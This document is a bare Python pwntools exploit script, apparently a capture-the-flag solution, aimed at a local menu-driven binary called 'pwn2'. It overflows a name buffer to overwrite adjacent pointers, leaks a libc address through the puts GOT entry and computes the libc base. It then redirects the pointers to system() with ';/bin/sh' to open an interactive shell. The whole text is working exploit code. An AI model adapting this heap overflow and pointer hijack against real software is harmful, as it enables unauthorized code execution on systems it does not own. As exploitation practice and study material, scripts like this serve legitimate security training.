#!/usr/bin/python
from pwn import *
import os
from time import sleep
e = ELF("./pwn2")
libc = ELF("./libc.so.6")

if 'remote' in os.environ:
	io = remote("localhost",1337)
else:
	io = process("./pwn2",env={"LD_PRELOAD":libc.path})
def add(name,age=None):
	if age is None:
		age=1337
	log.info(io.recv(timeout=2))
	io.sendline('1')
	io.sendlineafter('Enter name length: ',str(len(name)))
	io.sendlineafter("Enter person's name: ",name)
	io.sendlineafter("Enter person's age: ",str(age))
def edit(idx,name):
	log.info(io.recv(timeout=2))
	io.sendline('2')
	io.sendlineafter("Enter person's index (0-based): ",str(idx))
	io.sendlineafter("Enter new name length: ",str(len(name)+1))
	io.sendlineafter("Enter the new name:",name)
def pr(idx):
	log.info(io.recv(timeout=2))
	io.sendline('3')
	io.sendlineafter("Enter person's index (0-based):",str(idx))
def de(idx):
	log.info(io.recv(timeout=2))
	io.sendline('4')
	io.sendlineafter("Enter person's index (0-based):",str(idx))
def ex():
	log.info(io.recv(timeout=2))
	io.sendline('5')
raw_input("Exp?")
add(cyclic(7))
add(cyclic(7))
raw_input("Smash?")
#edit(0,cyclic(cyclic_find(0x62616172))+p32(e.plt['puts']))
payload = cyclic(168)+p32(0x080ebb10)+p32(e.got['puts'])+cyclic(312-168-8)+p32(0)+p32(0x11)+p32(0x080ebb10)+p32(e.got['puts'])+ cyclic(488-312-16)+p32(0x080ebb10)+p32(e.got['puts'])
#payload = cyclic(312)+(p32(0)+p32(0x11)+p32(e.plt['puts'])+p32(e.got['puts']))
edit(0,payload)
pr(1)
d= io.recv(timeout=2)
log.info(repr(d))
d= io.recv(timeout=2)
log.info(repr(d))
raw_input("Parse?")
off = d.find("\xf7")
log.info(repr(d[off-3:off+1]))
addr = u32(d[off-3:off+1])
log.info(hex(addr))
libcbase = addr- libc.symbols['__libc_start_main']
log.info(hex(libcbase))
log.info(hex(libcbase+0x15ba0b+0x2d0e3b))
raw_input("Next?")
#payload = cyclic(312)+(p32(0)+p32(0x11)+p32(libcbase+libc.symbols['system'])+";/bin/sh\x00")
payload = cyclic(168)+p32(libcbase+libc.symbols['system'])+";/bin/sh\x00"+cyclic(320-168-13)+p32(libcbase+libc.symbols['system'])+";/bin/sh\x00"+cyclic(488-320-13)+p32(libcbase+libc.symbols['system'])+";/bin/sh\x00"
edit(0,payload)
pr(1)
io.interactive()
